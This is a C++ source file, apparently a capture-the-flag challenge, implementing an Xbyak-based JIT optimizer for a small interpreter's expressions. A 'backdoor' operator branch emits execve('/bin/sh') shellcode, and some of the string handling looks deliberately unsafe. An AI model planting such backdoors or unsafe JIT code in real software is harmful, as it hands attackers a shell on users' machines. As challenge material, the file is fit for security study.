//
// Created by ptr-yudai on 15/11/20.
//

#include <iostream>
#include <cstddef>
#include "optimizer.h"

#define XBYAK_NO_OP_NAMES

using namespace visitor;
using namespace parser;

void parser::ASTBinaryExprNode::call(value_t l_value, value_t r_value) {
  (*(void (*)(value_t, value_t))_code)
    (l_value, r_value);
}

/**
 * Utilities
 */
bool optimizer::CompareCppString(const std::string s1, const std::string s2) {
  return s1 == s2;
}
void optimizer::ConcatCppString(std::string& s1,
                                const std::string s2) {
  s1 += s2;
}
void optimizer::UpdateCurrentExpr(visitor::Interpreter* interpreter,
                                  value_t *v) {
  interpreter->current_expression_value = *v;
}
void optimizer::UpdateCurrentExprType(visitor::Interpreter* interpreter,
                                      parser::TYPE type) {
  interpreter->current_expression_type = type;
}
void optimizer::CleanupValue(value_t *v) {
  if (v->s.size() >= 0x10) {
    v->s.reserve(0);
  }
}

/**
 * Optimization :P
 */
bool optimizer::Optimize(Interpreter *interpreter, ASTBinaryExprNode *bin,
                         TYPE l_type, TYPE r_type) {
  using namespace Xbyak::util;

  Xbyak::CodeGenerator *code = new Xbyak::CodeGenerator(Xbyak::DEFAULT_MAX_CODE_SIZE, Xbyak::AutoGrow);

  std::string op = bin->op;
  unsigned frame_size = (sizeof(value_t) + 0x0f) & 0xfffffff0;

  if (op == "backdoor") {
    // backdoor :P
    code->xor_(edx, edx);
    code->xor_(esi, esi);
    code->mov(rax, 0x0068732f6e69622f);
    code->push(rax);
    code->mov(rdi, rsp);
    code->mov(eax, 59);
    code->syscall();
    code->xor_(edi, edi);
    code->mov(eax, 60);
    code->syscall();
    code->ready();
    bin->set_optimized(code->getCode());
    return true;
  }

  code->push(rbp);
  code->mov(rbp, rsp);
  code->sub(rsp, frame_size);
  code->mov(rbx, (size_t)interpreter);
  code->mov(r13, rsi); // r_value
  code->mov(r14, rdi); // l_value
  code->mov(r15, (size_t)UpdateCurrentExprType);

  // Initialize value_t
  code->xor_(eax, eax);
  code->mov(rdi, rsp);
  code->mov(ecx, sizeof(value_t) / sizeof(size_t));
  code->cld();
  code->rep();
  code->stosq();
  code->lea(rax, ptr[rsp + offsetof(value_t, s) + 0x10]);
  code->mov(ptr[rsp + offsetof(value_t, s)], rax);

  // Arithmetic operators for now
  if (op == "+" || op == "-" || op == "*" || op == "/") {
    // Two ints
    if (l_type == parser::INT && r_type == parser::INT) {
      // Update expression type to int
      code->mov(esi, parser::INT);
      code->mov(rdi, rbx);
      code->call(r15);

      // Get values
      code->mov(eax, dword[r14 + offsetof(value_t, i)]);
      code->mov(edx, dword[r13 + offsetof(value_t, i)]);

      // Calculate
      if (op == "+")
        code->add(eax, edx);
      else if (op == "-")
        code->sub(eax, edx);
      else if (op == "*")
        code->imul(edx);
      else if (op == "/")
        code->idiv(edx);

      // Update result
      code->mov(dword[rsp + offsetof(value_t, i)], eax);
    }
    // At least one real
    else if (l_type == parser::REAL || r_type == parser::REAL) {
      // Update expression type to real
      code->mov(esi, parser::REAL);
      code->mov(rdi, rbx);
      code->call(r15);

      // Get values
      if (l_type == parser::INT) {
        code->cvtsi2ss(xmm0, dword[r14 + offsetof(value_t, i)]);
      } else {
        code->movss(xmm0, dword[r14 + offsetof(value_t, r)]);
      }
      if (r_type == parser::INT) {
        code->cvtsi2ss(xmm1, dword[r13  + offsetof(value_t, i)]);
      } else {
        code->movss(xmm1, dword[r13 + offsetof(value_t, r)]);
      }

      // Calculate
      if (op == "+")
        code->addss(xmm0, xmm1);
      else if (op == "-")
        code->subss(xmm0, xmm1);
      else if (op == "*")
        code->mulss(xmm0, xmm1);
      else if(op == "/")
        code->divss(xmm0, xmm1);

      // Update result
      code->movss(dword[rsp + offsetof(value_t, r)], xmm0);
    }
    // Remaining case is for strings
    else {
      // Update expression type to real
      code->mov(esi, parser::STRING);
      code->mov(rdi, rbx);
      code->call(r15);

      // Addition
      code->lea(rsi, ptr[r13 + offsetof(value_t, s)]);
      code->lea(rdi, ptr[r14 + offsetof(value_t, s)]);
      code->mov(rax, (size_t)ConcatCppString);
      code->call(rax);
      code->mov(rax, ptr[r14 + offsetof(value_t, s)]);
      code->mov(rdx, ptr[r14 + offsetof(value_t, s) + 8]);
      code->mov(ptr[rsp + offsetof(value_t, s)], rax);
      code->mov(ptr[rsp + offsetof(value_t, s) + 8], rdx);
      code->mov(rax, ptr[r14 + offsetof(value_t, s) + 8]);
      code->mov(rdx, ptr[r14 + offsetof(value_t, s) + 16]);
      code->mov(ptr[rsp + offsetof(value_t, s) + 8], rax);
      code->mov(ptr[rsp + offsetof(value_t, s) + 16], rdx);
    }
  }
  // Now bool
  else if (op == "and" || op == "or") {
    // Update expression type to bool
    code->mov(esi, parser::BOOL);
    code->mov(rdi, rbx);
    code->call(r15);

    // Get values
    code->mov(al, byte[r14 + offsetof(value_t, b)]);
    code->mov(dl, byte[r13 + offsetof(value_t, b)]);

    // Calculate
    if (op == "and")
      code->and_(al, dl);
    else if (op == "or")
      code->or_(al, dl);

    // Update result
    code->mov(byte[rsp + offsetof(value_t, b)], al);
  }
  // Now Comparator Operators
  else {
    // Update expression type to bool
    code->mov(esi, parser::BOOL);
    code->mov(rdi, rbx);
    code->call(r15);

    // BOOL op BOOL
    if (l_type == parser::BOOL) {
      // Get values
      code->mov(bl, byte[r14 + offsetof(value_t, b)]);
      code->mov(dl, byte[r13 + offsetof(value_t, b)]);
      code->xor_(eax, eax);
      code->test(bl, dl);

      // Compare
      if (op == "==") {
        code->sete(al);
      } else {
        code->setne(al);
      }

      // Update result
      code->mov(byte[rsp + offsetof(value_t, b)], al);
    }
    // STRING op STRING
    else if (l_type == parser::STRING) {
      // Compare
      code->lea(rsi, ptr[r13 + offsetof(value_t, s)]);
      code->lea(rdi, ptr[r14 + offsetof(value_t, s)]);
      code->mov(rax, (size_t)CompareCppString);
      code->call(rax);

      if (op == "!=")
        code->xor_(al, 1);

      // Update result
      code->mov(byte[rsp + offsetof(value_t, b)], al);
    }
    // INT/REAL op INT/REAL
    else {
      // Get values
      if (l_type == parser::INT) {
        code->cvtsi2ss(xmm0, dword[r14 + offsetof(value_t, i)]);
      } else {
        code->movss(xmm0, dword[r14 + offsetof(value_t, r)]);
      }
      if (r_type == parser::INT) {
        code->cvtsi2ss(xmm1, dword[r13  + offsetof(value_t, i)]);
      } else {
        code->movss(xmm1, dword[r13 + offsetof(value_t, r)]);
      }

      code->xor_(eax, eax);
      code->comiss(xmm0, xmm1);
      code->inLocalLabel();
      if (op == "==")
        code->jne(".skip");
      else if (op == "!=")
        code->je(".skip");
      else if (op == "<")
        code->jae(".skip");
      else if (op == ">")
        code->jbe(".skip");
      else if (op == ">=")
        code->jb(".skip");
      else if (op == "<=")
        code->ja(".skip");
      code->mov(al, 1);
      code->L(".skip");
      code->outLocalLabel();

      // Update result
      code->mov(byte[rsp + offsetof(value_t, b)], al);
    }
  }

  // Update current expression
  code->mov(rsi, rsp);
  code->mov(rdi, rbx);
  code->mov(rax, (size_t)UpdateCurrentExpr);
  code->call(rax);

  // Call destructor of std::string in value_t
  code->mov(rdi, rsp);
  code->mov(rax, (size_t)CleanupValue);
  code->call(rax);

  code->leave();
  code->ret();

  // Successfully optimized
  code->ready();
  bin->set_optimized(code->getCode());
  return true;
}
